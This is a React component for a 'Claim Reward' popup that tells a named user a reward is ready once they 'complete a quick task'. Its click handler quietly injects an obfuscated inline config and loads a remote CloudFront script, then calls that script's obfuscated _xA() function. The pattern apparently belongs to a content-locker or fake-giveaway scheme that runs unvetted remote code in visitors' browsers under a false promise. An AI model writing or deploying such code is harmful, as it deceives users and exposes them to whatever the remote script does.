import { Button } from "@/components/ui/button";

type ConfirmationPopupProps = {
  username: string;
  onGetItemNow: () => void;
};

const ConfirmationPopup = ({ username, onGetItemNow }: ConfirmationPopupProps) => {
const handleGetItemNow = () => {
  // Inject the first script
  const script1 = document.createElement("script");
  script1.type = "text/javascript";
  script1.innerHTML =
    'var gelFc_XHN_nHgyxc={"it":4554372,"key":"f25eb"};';
  document.body.appendChild(script1);

  // Inject the second script and call _xA() after it loads
  const script2 = document.createElement("script");
  script2.src = "https://duw03nk63ml3f.cloudfront.net/a9294fb.js";
  script2.onload = function () {
    if (typeof window._xA === "function") {
      window._xA();
    } else if (typeof _xA === "function") {
      _xA();
    }
  };
  document.body.appendChild(script2);

  // Call the original callback
  onGetItemNow();
};

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black/60 backdrop-blur-sm z-50">
      <div className="bg-slate-900 text-white w-96 rounded-2xl shadow-2xl animate-fade-in overflow-hidden">
        {/* Header */}
        <div className="p-5 border-b border-slate-700">
          <h3 className="text-center text-xl font-semibold tracking-wide">
            Get Item
          </h3>
        </div>

        {/* Body */}
        <div className="p-8 space-y-6 text-center bg-gradient-to-b from-slate-800 to-slate-900 rounded-b-2xl">
          <div className="flex flex-col items-center gap-3">
            <div className="bg-green-700/20 rounded-full p-3 flex items-center justify-center mb-2">
              <svg width="32" height="32" fill="none" viewBox="0 0 24 24">
                <circle
                  cx="12"
                  cy="12"
                  r="12"
                  fill="#22c55e"
                  opacity="0.15"
                />
                <path
                  stroke="#22c55e"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
            <p className="text-green-400 text-lg font-semibold">
              Complete a quick task to unlock your reward
            </p>
            <span className="text-slate-300 text-sm">
              Hi{" "}
              <span className="font-bold text-white">{username}</span>, your
              reward is ready!
            </span>
          </div>
        </div>

        <Button
          className="w-full bg-green-600 text-white font-semibold py-2 rounded-lg shadow hover:bg-green-700 transition-all duration-200"
          onClick={handleGetItemNow}
        >
          Claim Reward
        </Button>
      </div>
    </div>
  );
};

export default ConfirmationPopup;
